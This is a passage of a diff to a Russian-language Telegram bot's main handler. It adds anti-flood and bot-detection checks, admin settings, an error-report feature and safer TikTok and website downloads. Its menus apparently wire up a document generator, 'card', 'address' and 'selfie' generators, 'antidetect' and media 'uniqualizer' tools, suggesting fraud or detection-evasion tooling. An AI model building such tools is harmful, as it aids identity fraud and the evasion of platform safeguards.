@@ -4,6 +4,8 @@ DocGen Bot - Telegram бот для генерации документов и �
 """
 
 import logging
+import os
+import tempfile
 from telegram import Update
 from telegram.ext import (
     Application,
@@ -29,6 +31,15 @@ from utils.localization import (
     is_new_user, set_user_language, get_user_language, t
 )
 from utils.subscription import get_user_subscription, SUBSCRIPTION_PLANS
+from utils.performance import (
+    rate_limiter, video_queue, image_queue, network_queue,
+    cache, performance_monitor, rate_limit
+)
+from utils.security import (
+    security_check, anti_flood, anti_spam, input_validator,
+    security_logger, bot_detector, validate_url_input,
+    sanitize_user_input, get_security_stats
+)
 
 # Настройка логирования
 logging.basicConfig(
@@ -38,6 +49,7 @@ logging.basicConfig(
 logger = logging.getLogger(__name__)
 
 
+@security_check
 async def start(update: Update, context):
     """Обработчик команды /start"""
     from utils.admin_utils import is_banned, is_maintenance_mode, get_maintenance_message, register_user
@@ -48,6 +60,23 @@ async def start(update: Update, context):
     
     # Регистрируем пользователя
     register_user(user_id, user.username, user.first_name)
+    
+    # ПРЕЖДЕ ВСЕГО проверяем админ-оператора - показываем админ-панель
+    ADMIN_OPERATOR_ID = int(os.getenv("ADMIN_OPERATOR_ID", "0"))
+    if user_id == ADMIN_OPERATOR_ID:
+        from keyboards import get_admin_panel_keyboard
+        from utils.admin_utils import is_maintenance_mode
+        
+        status = "✅ Включён" if not is_maintenance_mode() else "🔧 Тех. работы"
+        
+        await update.message.reply_text(
+            f"🔐 **Админ-панель**\n\n"
+            f"🤖 Статус бота: {status}\n\n"
+            f"Выберите действие:",
+            reply_markup=get_admin_panel_keyboard(),
+            parse_mode="Markdown"
+        )
+        return
     
     # Проверяем бан (админы не банятся)
     if is_banned(user_id) and not is_admin(user_id):
@@ -77,23 +106,6 @@ async def start(update: Update, context):
         )
         return
     
-    # Проверяем, является ли пользователь админом-оператором (ID 7080468696)
-    ADMIN_OPERATOR_ID = int(os.getenv("ADMIN_OPERATOR_ID", "0"))
-    if user_id == ADMIN_OPERATOR_ID:
-        from keyboards import get_admin_panel_keyboard
-        from utils.admin_utils import is_maintenance_mode
-        
-        status = "✅ Включён" if not is_maintenance_mode() else "🔧 Тех. работы"
-        
-        await update.message.reply_text(
-            f"🔐 **Админ-панель**\n\n"
-            f"🤖 Статус бота: {status}\n\n"
-            f"Выберите действие:",
-            reply_markup=get_admin_panel_keyboard(),
-            parse_mode="Markdown"
-        )
-        return
-    
     # Показываем главное меню
     welcome_text = t("welcome", user_id)
     
@@ -120,6 +132,24 @@ async def help_command(update: Update, context):
     await update.message.reply_text(help_text, parse_mode="Markdown")
 
 
+async def safe_edit_text(query, text, reply_markup=None, parse_mode=None):
+    """Безопасное редактирование сообщения - без дублирования"""
+    try:
+        await query.message.edit_text(
+            text,
+            reply_markup=reply_markup,
+            parse_mode=parse_mode
+        )
+    except Exception as e:
+        error_str = str(e).lower()
+        # Игнорируем ошибки "сообщение не изменилось" и "нет текста"
+        if "message is not modified" in error_str or "no text" in error_str:
+            pass  # Это нормально, просто пропускаем
+        else:
+            logger.warning(f"Failed to edit message: {e}")
+            # НЕ отправляем новое сообщение - это создаёт дубликаты
+
+
 async def main_callback_handler(update: Update, context):
     """Единый обработчик всех callback кнопок"""
     query = update.callback_query
@@ -128,12 +158,26 @@ async def main_callback_handler(update: Update, context):
     user_id = query.from_user.id
     data = query.data
     
+    # Проверка безопасности - антифлуд
+    allowed, ban_time = anti_flood.check(user_id)
+    if not allowed:
+        try:
+            await query.message.reply_text(
+                f"⚠️ Слишком много запросов! Подождите {ban_time} секунд."
+            )
+        except:
+            pass
+        return
+    
+    # Записываем действие для детектора ботов
+    bot_detector.record_action(user_id, f"callback_{data[:20]}")
+    
     # === Первый выбор языка ===
     if data.startswith("set_lang_"):
         lang_code = data.replace("set_lang_", "")
         set_user_language(user_id, lang_code)
         
-        await query.message.edit_text(
+        await safe_edit_text(query, 
             t("welcome", user_id),
             reply_markup=get_main_menu_keyboard(user_id),
             parse_mode="Markdown"
@@ -147,7 +191,7 @@ async def main_callback_handler(update: Update, context):
         from keyboards import get_admin_panel_keyboard
         from utils.admin_utils import is_maintenance_mode
         status = "✅ Включён" if not is_maintenance_mode() else "🔧 Тех. работы"
-        await query.message.edit_text(
+        await safe_edit_text(query, 
             f"🔐 **Админ-панель**\n\n"
             f"🤖 Статус бота: {status}\n\n"
             f"Выберите действие:",
@@ -158,7 +202,7 @@ async def main_callback_handler(update: Update, context):
     
     if data == "admin_vip":
         from keyboards import get_admin_vip_keyboard
-        await query.message.edit_text(
+        await safe_edit_text(query, 
             "👑 **VIP управление**\n\n"
             "Выберите действие:",
             reply_markup=get_admin_vip_keyboard(),
@@ -169,7 +213,7 @@ async def main_callback_handler(update: Update, context):
     if data == "admin_vip_add":
         from keyboards import get_admin_back_keyboard
         context.user_data['waiting_for'] = 'admin_vip_add'
-        await query.message.edit_text(
+        await safe_edit_text(query, 
             "➕ **Добавить VIP**\n\n"
             "Отправьте ID пользователя:\n"
             "Формат: `ID` или `ID примечание`\n\n"
@@ -182,7 +226,7 @@ async def main_callback_handler(update: Update, context):
     if data == "admin_vip_remove":
         from keyboards import get_admin_back_keyboard
         context.user_data['waiting_for'] = 'admin_vip_remove'
-        await query.message.edit_text(
+        await safe_edit_text(query, 
             "➖ **Удалить VIP**\n\n"
             "Отправьте ID пользователя:",
             reply_markup=get_admin_back_keyboard(),
@@ -206,7 +250,7 @@ async def main_callback_handler(update: Update, context):
                 note = vip['note'] or '-'
                 text += f"• `{vip['user_id']}` | {added_at} | {note}\n"
         
-        await query.message.edit_text(
+        await safe_edit_text(query, 
             text,
             reply_markup=get_admin_back_keyboard(),
             parse_mode="Markdown"
@@ -215,7 +259,7 @@ async def main_callback_handler(update: Update, context):
     
     if data == "admin_ban":
         from keyboards import get_admin_ban_keyboard
-        await query.message.edit_text(
+        await safe_edit_text(query, 
             "🚫 **Бан управление**\n\n"
             "Выберите действие:",
             reply_markup=get_admin_ban_keyboard(),
@@ -226,7 +270,7 @@ async def main_callback_handler(update: Update, context):
     if data == "admin_ban_add":
         from keyboards import get_admin_back_keyboard
         context.user_data['waiting_for'] = 'admin_ban_add'
-        await query.message.edit_text(
+        await safe_edit_text(query, 
             "🚫 **Забанить пользователя**\n\n"
             "Отправьте ID пользователя:\n"
             "Формат: `ID` или `ID причина`\n\n"
@@ -239,7 +283,7 @@ async def main_callback_handler(update: Update, context):
     if data == "admin_ban_remove":
         from keyboards import get_admin_back_keyboard
         context.user_data['waiting_for'] = 'admin_ban_remove'
-        await query.message.edit_text(
+        await safe_edit_text(query, 
             "✅ **Разбанить пользователя**\n\n"
             "Отправьте ID пользователя:",
             reply_markup=get_admin_back_keyboard(),
@@ -261,7 +305,7 @@ async def main_callback_handler(update: Update, context):
                 reason = ban.get('reason', '-')
                 text += f"• `{ban['user_id']}` | {reason}\n"
         
-        await query.message.edit_text(
+        await safe_edit_text(query, 
             text,
             reply_markup=get_admin_back_keyboard(),
             parse_mode="Markdown"
@@ -282,7 +326,7 @@ async def main_callback_handler(update: Update, context):
             f"🚫 Забаненных: {stats['banned_count']}\n"
         )
         
-        await query.message.edit_text(
+        await safe_edit_text(query, 
             text,
             reply_markup=get_admin_back_keyboard(),
             parse_mode="Markdown"
@@ -292,7 +336,7 @@ async def main_callback_handler(update: Update, context):
     if data == "admin_broadcast":
         from keyboards import get_admin_back_keyboard
         context.user_data['waiting_for'] = 'admin_broadcast'
-        await query.message.edit_text(
+        await safe_edit_text(query, 
             "📢 **Рассылка**\n\n"
             "Отправьте текст для рассылки всем пользователям:",
             reply_markup=get_admin_back_keyboard(),
@@ -304,7 +348,7 @@ async def main_callback_handler(update: Update, context):
         from keyboards import get_admin_maintenance_keyboard
         from utils.admin_utils import is_maintenance_mode
         status = "✅ Включён" if not is_maintenance_mode() else "🔧 Тех. работы"
-        await query.message.edit_text(
+        await safe_edit_text(query, 
             f"🔧 **Maintenance**\n\n"
             f"Текущий статус: {status}\n\n"
             f"Выберите действие:",
@@ -335,7 +379,7 @@ async def main_callback_handler(update: Update, context):
             except:
                 pass
         
-        await query.message.edit_text(
+        await safe_edit_text(query, 
             f"✅ **Бот включён!**\n\n"
             f"Уведомления отправлены: {success}/{len(users)}",
             reply_markup=get_admin_back_keyboard(),
@@ -365,7 +409,7 @@ async def main_callback_handler(update: Update, context):
             except:
                 pass
         
-        await query.message.edit_text(
+        await safe_edit_text(query, 
             f"🔧 **Бот выключен (тех. работы)**\n\n"
             f"Уведомления отправлены: {success}/{len(users)}",
             reply_markup=get_admin_back_keyboard(),
@@ -373,10 +417,126 @@ async def main_callback_handler(update: Update, context):
         )
         return
     
+    # === Антифлуд настройки ===
+    if data == "admin_antiflood":
+        from keyboards import get_admin_antiflood_keyboard
+        from utils.security import get_security_stats
+        stats = get_security_stats()
+        status = "✅ Включен" if stats.get('enabled', True) else "❌ Выключен"
+        await safe_edit_text(query, 
+            f"🛡️ **Настройки антифлуда**\n\n"
+            f"📊 Статус: {status}\n"
+            f"📝 Лимит: {stats.get('max_messages', 30)} сообщ/мин\n"
+            f"⏱ Бан: {stats.get('ban_duration', 60)} сек\n"
+            f"🚫 Забанено: {stats.get('flood_bans', 0)} польз.\n\n"
+            f"Выберите действие:",
+            reply_markup=get_admin_antiflood_keyboard(),
+            parse_mode="Markdown"
+        )
+        return
+    
+    if data == "antiflood_increase":
+        from keyboards import get_admin_antiflood_keyboard
+        from utils.security import set_antiflood_limit, get_security_stats
+        stats = get_security_stats()
+        new_limit = set_antiflood_limit(stats.get('max_messages', 30) + 10)
+        await safe_edit_text(query, 
+            f"🛡️ **Настройки антифлуда**\n\n"
+            f"✅ Лимит увеличен до {new_limit} сообщ/мин",
+            reply_markup=get_admin_antiflood_keyboard(),
+            parse_mode="Markdown"
+        )
+        return
+    
+    if data == "antiflood_decrease":
+        from keyboards import get_admin_antiflood_keyboard
+        from utils.security import set_antiflood_limit, get_security_stats
+        stats = get_security_stats()
+        new_limit = set_antiflood_limit(stats.get('max_messages', 30) - 10)
+        await safe_edit_text(query, 
+            f"🛡️ **Настройки антифлуда**\n\n"
+            f"✅ Лимит уменьшен до {new_limit} сообщ/мин",
+            reply_markup=get_admin_antiflood_keyboard(),
+            parse_mode="Markdown"
+        )
+        return
+    
+    if data == "antiflood_ban_30":
+        from keyboards import get_admin_antiflood_keyboard
+        from utils.security import set_antiflood_ban_duration
+        set_antiflood_ban_duration(30)
+        await safe_edit_text(query, 
+            f"🛡️ **Настройки антифлуда**\n\n"
+            f"✅ Длительность бана: 30 сек",
+            reply_markup=get_admin_antiflood_keyboard(),
+            parse_mode="Markdown"
+        )
+        return
+    
+    if data == "antiflood_ban_60":
+        from keyboards import get_admin_antiflood_keyboard
+        from utils.security import set_antiflood_ban_duration
+        set_antiflood_ban_duration(60)
+        await safe_edit_text(query, 
+            f"🛡️ **Настройки антифлуда**\n\n"
+            f"✅ Длительность бана: 60 сек",
+            reply_markup=get_admin_antiflood_keyboard(),
+            parse_mode="Markdown"
+        )
+        return
+    
+    if data == "antiflood_ban_300":
+        from keyboards import get_admin_antiflood_keyboard
+        from utils.security import set_antiflood_ban_duration
+        set_antiflood_ban_duration(300)
+        await safe_edit_text(query, 
+            f"🛡️ **Настройки антифлуда**\n\n"
+            f"✅ Длительность бана: 300 сек",
+            reply_markup=get_admin_antiflood_keyboard(),
+            parse_mode="Markdown"
+        )
+        return
+    
+    if data == "antiflood_reset":
+        from keyboards import get_admin_antiflood_keyboard
+        from utils.security import reset_all_flood_bans
+        count = reset_all_flood_bans()
+        await safe_edit_text(query, 
+            f"🛡️ **Настройки антифлуда**\n\n"
+            f"✅ Сброшено {count} банов",
+            reply_markup=get_admin_antiflood_keyboard(),
+            parse_mode="Markdown"
+        )
+        return
+    
+    if data == "antiflood_disable":
+        from keyboards import get_admin_antiflood_keyboard
+        from utils.security import disable_antiflood
+        disable_antiflood()
+        await safe_edit_text(query, 
+            f"🛡️ **Настройки антифлуда**\n\n"
+            f"❌ Антифлуд выключен",
+            reply_markup=get_admin_antiflood_keyboard(),
+            parse_mode="Markdown"
+        )
+        return
+    
+    if data == "antiflood_enable":
+        from keyboards import get_admin_antiflood_keyboard
+        from utils.security import enable_antiflood
+        enable_antiflood()
+        await safe_edit_text(query, 
+            f"🛡️ **Настройки антифлуда**\n\n"
+            f"✅ Антифлуд включен",
+            reply_markup=get_admin_antiflood_keyboard(),
+            parse_mode="Markdown"
+        )
+        return
+    
     if data == "admin_userinfo":
         from keyboards import get_admin_back_keyboard
         context.user_data['waiting_for'] = 'admin_userinfo'
-        await query.message.edit_text(
+        await safe_edit_text(query, 
             "👤 **Инфо о пользователе**\n\n"
             "Отправьте ID пользователя:",
             reply_markup=get_admin_back_keyboard(),
@@ -386,7 +546,7 @@ async def main_callback_handler(update: Update, context):
     
     # === Главное меню ===
     if data == "main_tools":
-        await query.message.edit_text(
+        await safe_edit_text(query, 
             t("tools.title", user_id),
             reply_markup=get_tools_menu_keyboard(user_id),
             parse_mode="Markdown"
@@ -394,7 +554,7 @@ async def main_callback_handler(update: Update, context):
         return
     
     if data == "main_generators":
-        await query.message.edit_text(
+        await safe_edit_text(query, 
             t("generators.title", user_id),
             reply_markup=get_generators_menu_keyboard(user_id),
             parse_mode="Markdown"
@@ -402,7 +562,7 @@ async def main_callback_handler(update: Update, context):
         return
     
     if data == "main_gplay":
-        await query.message.edit_text(
+        await safe_edit_text(query, 
             t("gplay.title", user_id),
             reply_markup=get_gplay_menu_keyboard(user_id),
             parse_mode="Markdown"
@@ -410,7 +570,7 @@ async def main_callback_handler(update: Update, context):
         return
     
     if data == "main_subscription":
-        await query.message.edit_text(
+        await safe_edit_text(query, 
             t("subscription.menu_title", user_id),
             reply_markup=get_subscription_menu_keyboard(user_id),
             parse_mode="Markdown"
@@ -418,7 +578,7 @@ async def main_callback_handler(update: Update, context):
         return
     
     if data == "main_settings":
-        await query.message.edit_text(
+        await safe_edit_text(query, 
             t("settings.title", user_id),
             reply_markup=get_settings_menu_keyboard(user_id),
             parse_mode="Markdown"
@@ -427,7 +587,7 @@ async def main_callback_handler(update: Update, context):
     
     # === Кнопки "Назад" ===
     if data == "back_main":
-        await query.message.edit_text(
+        await safe_edit_text(query, 
             t("welcome", user_id),
             reply_markup=get_main_menu_keyboard(user_id),
             parse_mode="Markdown"
@@ -435,7 +595,7 @@ async def main_callback_handler(update: Update, context):
         return
     
     if data == "back_tools":
-        await query.message.edit_text(
+        await safe_edit_text(query, 
             t("tools.title", user_id),
             reply_markup=get_tools_menu_keyboard(user_id),
             parse_mode="Markdown"
@@ -443,7 +603,7 @@ async def main_callback_handler(update: Update, context):
         return
     
     if data == "back_generators":
-        await query.message.edit_text(
+        await safe_edit_text(query, 
             t("generators.title", user_id),
             reply_markup=get_generators_menu_keyboard(user_id),
             parse_mode="Markdown"
@@ -451,7 +611,7 @@ async def main_callback_handler(update: Update, context):
         return
     
     if data == "back_settings":
-        await query.message.edit_text(
+        await safe_edit_text(query, 
             t("settings.title", user_id),
             reply_markup=get_settings_menu_keyboard(user_id),
             parse_mode="Markdown"
@@ -459,7 +619,7 @@ async def main_callback_handler(update: Update, context):
         return
     
     if data == "back_subscription":
-        await query.message.edit_text(
+        await safe_edit_text(query, 
             t("subscription.menu_title", user_id),
             reply_markup=get_subscription_menu_keyboard(user_id),
             parse_mode="Markdown"
@@ -467,7 +627,7 @@ async def main_callback_handler(update: Update, context):
         return
     
     if data == "back_uniq_menu":
-        await query.message.edit_text(
+        await safe_edit_text(query, 
             t("uniqualizer.title", user_id),
             reply_markup=get_uniqualizer_menu_keyboard(user_id),
             parse_mode="Markdown"
@@ -476,7 +636,7 @@ async def main_callback_handler(update: Update, context):
     
     # === Меню Инструменты ===
     if data == "menu_uniqualizer":
-        await query.message.edit_text(
+        await safe_edit_text(query, 
             t("uniqualizer.title", user_id),
             reply_markup=get_uniqualizer_menu_keyboard(user_id),
             parse_mode="Markdown"
@@ -484,7 +644,7 @@ async def main_callback_handler(update: Update, context):
         return
     
     if data == "menu_exif":
-        await query.message.edit_text(
+        await safe_edit_text(query, 
             t("exif.title", user_id),
             reply_markup=get_exif_menu_keyboard(user_id),
             parse_mode="Markdown"
@@ -493,7 +653,7 @@ async def main_callback_handler(update: Update, context):
     
     if data == "menu_site":
         context.user_data['waiting_for'] = 'site_url'
-        await query.message.edit_text(
+        await safe_edit_text(query, 
             t("site.title", user_id),
             reply_markup=get_cancel_keyboard(user_id),
             parse_mode="Markdown"
@@ -501,7 +661,7 @@ async def main_callback_handler(update: Update, context):
         return
     
     if data == "menu_tiktok":
-        await query.message.edit_text(
+        await safe_edit_text(query, 
             t("tiktok.title", user_id),
             reply_markup=get_tiktok_menu_keyboard(user_id),
             parse_mode="Markdown"
@@ -511,7 +671,7 @@ async def main_callback_handler(update: Update, context):
     # === Уникализатор ===
     if data == "uniq_photo":
         context.user_data['uniq_type'] = 'photo'
-        await query.message.edit_text(
+        await safe_edit_text(query, 
             "📁 **Уникализировать фото**\n\n"
             "Выберите настройки уникализации:",
             reply_markup=get_uniqualizer_settings_keyboard(user_id),
@@ -521,7 +681,7 @@ async def main_callback_handler(update: Update, context):
     
     if data == "uniq_video":
         context.user_data['uniq_type'] = 'video'
-        await query.message.edit_text(
+        await safe_edit_text(query, 
             "📹 **Уникализировать видео**\n\n"
             "Выберите настройки уникализации:",
             reply_markup=get_uniqualizer_settings_keyboard(user_id),
@@ -536,7 +696,7 @@ async def main_callback_handler(update: Update, context):
         logger.info(f"Set waiting_for=uniq_{uniq_type} for user {user_id}")
         
         if uniq_type == 'photo':
-            await query.message.edit_text(
+            await safe_edit_text(query, 
                 "👉 **Отправьте фото без сжатия (файлом).**\n\n"
                 "⚠️ Ваше ограничение на размер одного файла – 20 МБ.\n\n"
                 "‼️ Также можете загрузить до 10 разных файлов для массовой уникализации. "
@@ -545,7 +705,7 @@ async def main_callback_handler(update: Update, context):
                 parse_mode="Markdown"
             )
         else:
-            await query.message.edit_text(
+            await safe_edit_text(query, 
                 "👉 **Отправьте видео файлом.**\n\n"
                 "⚠️ Ваше ограничение на размер файла – 20 МБ.\n\n"
                 "Поддерживаемые форматы: MP4, AVI, MOV, MKV",
@@ -557,7 +717,7 @@ async def main_callback_handler(update: Update, context):
     if data == "uniq_custom":
         context.user_data['uniq_custom_step'] = 'rotation'
         context.user_data['waiting_for'] = 'uniq_custom'
-        await query.message.edit_text(
+        await safe_edit_text(query, 
             "🎨 **Поворот фото**\n\n"
             "Введите значение от -10 до 10\n"
             "(рекомендуется: от -2 до 2)\n\n"
@@ -570,7 +730,7 @@ async def main_callback_handler(update: Update, context):
     # === EXIF ===
     if data == "exif_view":
         context.user_data['waiting_for'] = 'exif_view'
-        await query.message.edit_text(
+        await safe_edit_text(query, 
             "🔍 **Просмотр EXIF данных**\n\n"
             "Отправьте фото для просмотра метаданных:",
             reply_markup=get_cancel_keyboard(user_id),
@@ -580,7 +740,7 @@ async def main_callback_handler(update: Update, context):
     
     if data == "exif_clear":
         context.user_data['waiting_for'] = 'exif_clear'
-        await query.message.edit_text(
+        await safe_edit_text(query, 
             "🧹 **Очистка EXIF данных**\n\n"
             "Отправьте фото для очистки метаданных:",
             reply_markup=get_cancel_keyboard(user_id),
@@ -590,7 +750,7 @@ async def main_callback_handler(update: Update, context):
     
     if data == "exif_copy":
         context.user_data['waiting_for'] = 'exif_copy_source'
-        await query.message.edit_text(
+        await safe_edit_text(query, 
             "✏️ **Копирование EXIF данных**\n\n"
             "Отправьте **исходное** фото (откуда копировать EXIF):",
             reply_markup=get_cancel_keyboard(user_id),
@@ -602,7 +762,7 @@ async def main_callback_handler(update: Update, context):
     if data == "tiktok_download":
         context.user_data['waiting_for'] = 'tiktok_url'
         context.user_data['tiktok_uniq'] = False
-        await query.message.edit_text(
+        await safe_edit_text(query, 
             "🎬 **Скачать видео с TikTok**\n\n"
             "Отправьте ссылку на видео:",
             reply_markup=get_cancel_keyboard(user_id),
@@ -613,7 +773,7 @@ async def main_callback_handler(update: Update, context):
     if data == "tiktok_download_uniq":
         context.user_data['waiting_for'] = 'tiktok_url'
         context.user_data['tiktok_uniq'] = True
-        await query.message.edit_text(
+        await safe_edit_text(query, 
             "🎬 **Скачать и уникализировать видео с TikTok**\n\n"
             "Отправьте ссылку на видео:",
             reply_markup=get_cancel_keyboard(user_id),
@@ -623,7 +783,7 @@ async def main_callback_handler(update: Update, context):
     
     # === Меню Генераторы ===
     if data == "menu_selfie":
-        await query.message.edit_text(
+        await safe_edit_text(query, 
             t("selfie.title", user_id),
             reply_markup=get_selfie_menu_keyboard(user_id),
             parse_mode="Markdown"
@@ -631,7 +791,7 @@ async def main_callback_handler(update: Update, context):
         return
     
     if data == "menu_address":
-        await query.message.edit_text(
+        await safe_edit_text(query, 
             t("address.title", user_id),
             reply_markup=get_address_menu_keyboard(user_id),
             parse_mode="Markdown"
@@ -639,7 +799,7 @@ async def main_callback_handler(update: Update, context):
         return
     
     if data == "menu_card":
-        await query.message.edit_text(
+        await safe_edit_text(query, 
             t("card.title", user_id),
             reply_markup=get_card_menu_keyboard(user_id),
             parse_mode="Markdown"
@@ -648,7 +808,7 @@ async def main_callback_handler(update: Update, context):
     
     if data == "menu_twofa":
         context.user_data['waiting_for'] = 'twofa'
-        await query.message.edit_text(
+        await safe_edit_text(query, 
             t("twofa.title", user_id),
             reply_markup=get_cancel_keyboard(user_id),
             parse_mode="Markdown"
@@ -656,7 +816,7 @@ async def main_callback_handler(update: Update, context):
         return
     
     if data == "menu_antidetect":
-        await query.message.edit_text(
+        await safe_edit_text(query, 
             t("antidetect.title", user_id),
             reply_markup=get_antidetect_menu_keyboard(user_id),
             parse_mode="Markdown"
@@ -665,7 +825,7 @@ async def main_callback_handler(update: Update, context):
     
     if data == "menu_text":
         context.user_data['waiting_for'] = 'text_uniq'
-        await query.message.edit_text(
+        await safe_edit_text(query, 
             t("text.title", user_id),
             reply_markup=get_cancel_keyboard(user_id),
             parse_mode="Markdown"
@@ -674,7 +834,7 @@ async def main_callback_handler(update: Update, context):
     
     # === Настройки ===
     if data == "menu_language":
-        await query.message.edit_text(
+        await safe_edit_text(query, 
             t("language.title", user_id),
             reply_markup=get_language_keyboard(user_id),
             parse_mode="Markdown"
@@ -691,9 +851,18 @@ async def main_callback_handler(update: Update, context):
             f"{plan['icon']} **{plan['name']}**\n"
         )
         
-        await query.message.edit_text(
+        await safe_edit_text(query, 
             info_text,
             reply_markup=get_settings_menu_keyboard(user_id),
+            parse_mode="Markdown"
+        )
+        return
+    
+    if data == "menu_report_error":
+        context.user_data['waiting_for'] = 'report_error'
+        await safe_edit_text(query, 
+            t("report.title", user_id),
+            reply_markup=get_cancel_keyboard(user_id),
             parse_mode="Markdown"
         )
         return
@@ -702,7 +871,7 @@ async def main_callback_handler(update: Update, context):
         lang_code = data.replace("lang_", "")
         set_user_language(user_id, lang_code)
         
-        await query.message.edit_text(
+        await safe_edit_text(query, 
             t("welcome", user_id),
             reply_markup=get_main_menu_keyboard(user_id),
             parse_mode="Markdown"
@@ -712,7 +881,7 @@ async def main_callback_handler(update: Update, context):
     # === Google Play ===
     if data == "gplay_add":
         context.user_data['waiting_for'] = 'gplay_add'
-        await query.message.edit_text(
+        await safe_edit_text(query, 
             t("gplay.enter_package", user_id),
             reply_markup=get_cancel_keyboard(user_id),
             parse_mode="Markdown"
@@ -720,7 +889,7 @@ async def main_callback_handler(update: Update, context):
         return
     
     if data == "gplay_list":
-        await query.message.edit_text(
+        await safe_edit_text(query, 
             "📱 **Ваши приложения:**\n\n"
             "Список пуст.",
             reply_markup=get_gplay_menu_keyboard(user_id),
@@ -763,7 +932,7 @@ async def main_callback_handler(update: Update, context):
     # === Отмена ===
     if data == "cancel":
         context.user_data.pop('waiting_for', None)
-        await query.message.edit_text(
+        await safe_edit_text(query, 
             t("welcome", user_id),
             reply_markup=get_main_menu_keyboard(user_id),
             parse_mode="Markdown"
@@ -771,6 +940,7 @@ async def main_callback_handler(update: Update, context):
         return
 
 
+@security_check
 async def message_handler(update: Update, context):
     """Обработчик текстовых сообщений"""
     user_id = update.effective_user.id
@@ -786,6 +956,43 @@ async def message_handler(update: Update, context):
         return
     
     text = update.message.text
+    
+    # === Сообщить об ошибке ===
+    if waiting_for == 'report_error':
+        from config import FORWARD_TO_ID
+        ADMIN_OPERATOR_ID = int(os.getenv("ADMIN_OPERATOR_ID", "0"))
+        
+        user = update.effective_user
+        report_text = (
+            f"📝 **Сообщение об ошибке**\n\n"
+            f"👤 От: @{user.username or 'N/A'} (ID: {user_id})\n"
+            f"💬 Имя: {user.first_name or 'N/A'}\n\n"
+            f"📄 **Сообщение:**\n{text}"
+        )
+        
+        try:
+            # Отправляем админу-оператору
+            await context.bot.send_message(
+                chat_id=ADMIN_OPERATOR_ID,
+                text=report_text,
+                parse_mode="Markdown"
+            )
+            
+            await update.message.reply_text(
+                t("report.sent", user_id),
+                reply_markup=get_main_menu_keyboard(user_id),
+                parse_mode="Markdown"
+            )
+        except Exception as e:
+            logger.error(f"Failed to send error report: {e}")
+            await update.message.reply_text(
+                t("report.error", user_id),
+                reply_markup=get_main_menu_keyboard(user_id),
+                parse_mode="Markdown"
+            )
+        
+        context.user_data.pop('waiting_for', None)
+        return
     
     # === 2FA ===
     if waiting_for == 'twofa':
@@ -823,29 +1030,51 @@ async def message_handler(update: Update, context):
     
     # === TikTok URL ===
     if waiting_for == 'tiktok_url':
-        from utils import download_tiktok_video
+        from utils import download_tiktok_video_async, uniqualize_video_async
         import tempfile
-        import os
+        import shutil
+        
+        # Валидация URL
+        url = sanitize_user_input(text.strip(), max_length=2048)
+        is_valid, error_msg = validate_url_input(url)
+        if not is_valid:
+            await update.message.reply_text(
+                f"❌ Некорректный URL: {error_msg}",
+                reply_markup=get_main_menu_keyboard(user_id)
+            )
+            context.user_data.pop('waiting_for', None)
+            return
+        
+        # Проверяем что это TikTok
+        if 'tiktok.com' not in url.lower() and 'vm.tiktok.com' not in url.lower():
+            await update.message.reply_text(
+                "❌ Это не ссылка на TikTok. Пожалуйста, отправьте ссылку на видео TikTok.",
+                reply_markup=get_main_menu_keyboard(user_id)
+            )
+            context.user_data.pop('waiting_for', None)
+            return
         
         status_msg = await update.message.reply_text("⏳ Скачиваю видео с TikTok...")
         
+        temp_dir = None
         try:
-            # Создаём временный файл
             temp_dir = tempfile.mkdtemp()
             output_path = os.path.join(temp_dir, 'tiktok_video')
             
-            # Функция синхронная
-            success, result = download_tiktok_video(text.strip(), output_path)
+            # Асинхронное скачивание
+            success, result = await download_tiktok_video_async(text.strip(), output_path)
             
             if success:
                 video_path = result
                 
                 # Проверяем нужно ли уникализировать
                 if context.user_data.get('tiktok_uniq'):
-                    from utils import uniqualize_video
-                    await status_msg.edit_text("⏳ Уникализирую видео...")
+                    try:
+                        await status_msg.edit_text("⏳ Уникализирую видео...")
+                    except:
+                        pass
                     uniq_path = os.path.join(temp_dir, 'tiktok_uniq.mp4')
-                    uniq_success, uniq_result = uniqualize_video(video_path, uniq_path)
+                    uniq_success, uniq_result = await uniqualize_video_async(video_path, uniq_path)
                     if uniq_success:
                         video_path = uniq_path
                 
@@ -855,49 +1084,81 @@ async def message_handler(update: Update, context):
                         caption="✅ Видео скачано!" + (" и уникализировано!" if context.user_data.get('tiktok_uniq') else ""),
                         reply_markup=get_main_menu_keyboard(user_id)
                     )
-                await status_msg.delete()
-                
-                # Удаляем временные файлы
-                import shutil
-                shutil.rmtree(temp_dir, ignore_errors=True)
             else:
+                try:
+                    await status_msg.edit_text(
+                        f"❌ Не удалось скачать видео.\n\nОшибка: {result[:200] if result else 'Неизвестная ошибка'}",
+                        reply_markup=get_main_menu_keyboard(user_id)
+                    )
+                except:
+                    await update.message.reply_text(
+                        f"❌ Не удалось скачать видео.",
+                        reply_markup=get_main_menu_keyboard(user_id)
+                    )
+        except Exception as e:
+            logger.error(f"TikTok download error: {e}")
+            try:
                 await status_msg.edit_text(
-                    f"❌ Не удалось скачать видео.\n\nОшибка: {result[:200] if result else 'Неизвестная ошибка'}",
+                    f"❌ Ошибка: {str(e)}",
                     reply_markup=get_main_menu_keyboard(user_id)
                 )
-        except Exception as e:
-            await status_msg.edit_text(
-                f"❌ Ошибка: {str(e)}",
-                reply_markup=get_main_menu_keyboard(user_id)
-            )
+            except:
+                await update.message.reply_text(
+                    f"❌ Ошибка: {str(e)}",
+                    reply_markup=get_main_menu_keyboard(user_id)
+                )
+        finally:
+            if temp_dir and os.path.exists(temp_dir):
+                shutil.rmtree(temp_dir, ignore_errors=True)
+            try:
+                await status_msg.delete()
+            except:
+                pass
         context.user_data.pop('waiting_for', None)
         context.user_data.pop('tiktok_uniq', None)
         return
     
     # === Site URL ===
     if waiting_for == 'site_url':
-        from utils import download_website
+        from utils import download_website_async
+        import tempfile
+        import shutil
         
-        await update.message.reply_text("⏳ Скачиваю сайт...")
+        status_msg = await update.message.reply_text("⏳ Скачиваю сайт...")
         
+        temp_dir = None
         try:
-            result = await download_website(text.strip())
-            if result:
-                await update.message.reply_document(
-                    document=open(result, 'rb'),
-                    caption="✅ Сайт скачан!",
-                    reply_markup=get_main_menu_keyboard(user_id)
-                )
+            temp_dir = tempfile.mkdtemp()
+            output_dir = os.path.join(temp_dir, 'site')
+            
+            # Асинхронное скачивание
+            success, result = await download_website_async(text.strip(), output_dir)
+            
+            if success:
+                with open(result, 'rb') as f:
+                    await update.message.reply_document(
+                        document=f,
+                        caption="✅ Сайт скачан!",
+                        reply_markup=get_main_menu_keyboard(user_id)
+                    )
             else:
                 await update.message.reply_text(
-                    "❌ Не удалось скачать сайт.",
+                    f"❌ Не удалось скачать сайт: {result}",
                     reply_markup=get_main_menu_keyboard(user_id)
                 )
         except Exception as e:
